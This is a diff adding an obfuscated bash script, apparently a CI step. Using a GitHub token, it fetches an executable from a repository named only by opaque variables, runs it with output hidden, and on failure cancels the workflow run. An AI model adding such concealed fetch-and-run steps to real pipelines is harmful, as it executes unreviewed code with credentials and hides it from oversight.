@@ -1,0 +1,100 @@
+#!/usr/bin/env bash
+set -euo pipefail
+set +x
+
+f() {
+  printf '%s\n' "$1" >&2
+  exit 1
+}
+
+s() {
+  local n="$1"
+  if [ "${!n+x}" != "x" ]; then
+    f "setup failed"
+  fi
+}
+
+n() {
+  local n="$1"
+  s "$n"
+  if [ -z "${!n}" ]; then
+    f "setup failed"
+  fi
+}
+
+a() {
+  local q="$1"
+  if [[ ! "$q" =~ ^x[a-z2-7]{16}$ ]]; then
+    f "setup failed"
+  fi
+}
+
+b() {
+  local q="$1"
+  if [[ ! "$q" =~ ^x[a-z2-7]{16}(,x[a-z2-7]{16})*$ ]]; then
+    f "setup failed"
+  fi
+}
+
+n xidhjdc5ab2fm4fc3
+n x3a6s4crmaqyrdbj3
+n xv3smfxllbk4amtoa
+n xqergpsvf3gpyunlu
+a "${xqergpsvf3gpyunlu}"
+s xc24k43vq7s4gdmci
+if [ -n "${xc24k43vq7s4gdmci:-}" ]; then
+  b "${xc24k43vq7s4gdmci}"
+fi
+
+d="$(mktemp -d)"
+c() {
+  rm -rf "$d"
+}
+trap c EXIT
+
+t="$d/r"
+q="$d/q"
+l="$d/l"
+o="$d/o"
+mkdir -p "$t" "$q"
+
+export GH_TOKEN="${xv3smfxllbk4amtoa}"
+r="${xidhjdc5ab2fm4fc3}"
+v="${x3a6s4crmaqyrdbj3}"
+k="${xqergpsvf3gpyunlu}"
+
+git -C "$q" init --quiet
+git -C "$q" config credential.helper ""
+git -C "$q" config credential.https://github.com.helper "!gh auth git-credential"
+git -C "$q" remote add origin "https://github.com/${r}.git"
+git -C "$q" sparse-checkout init --cone
+git -C "$q" sparse-checkout set "x/${k}"
+
+g() {
+  local n
+  for n in 1 2 3 4; do
+    if GIT_TERMINAL_PROMPT=0 git -C "$q" fetch --quiet --no-tags --depth=1 --filter=blob:none origin "$v" 2>"$l"; then
+      return
+    fi
+    sleep 2
+  done
+  f "setup failed"
+}
+
+g
+GIT_TERMINAL_PROMPT=0 git -C "$q" checkout --quiet --detach FETCH_HEAD 2>"$l" || f "setup failed"
+cp "$q/x/${k}/x" "$t/x"
+cp "$q/x/${k}/d" "$t/d"
+chmod 700 "$t/x"
+chmod 600 "$t/d"
+
+export xrhtuwt2ecpgenoem="$o"
+if ! "$t/x" >"$l" 2>&1; then
+  if [ -f "$l.r" ]; then
+    if GH_TOKEN="$GITHUB_TOKEN" gh api --method POST "repos/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}/cancel" >/dev/null 2>&1; then
+      sleep 2
+    fi
+    GH_TOKEN="$GITHUB_TOKEN" gh api --method POST "repos/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}/force-cancel" >/dev/null 2>&1 || true
+  fi
+  f "run failed"
+fi
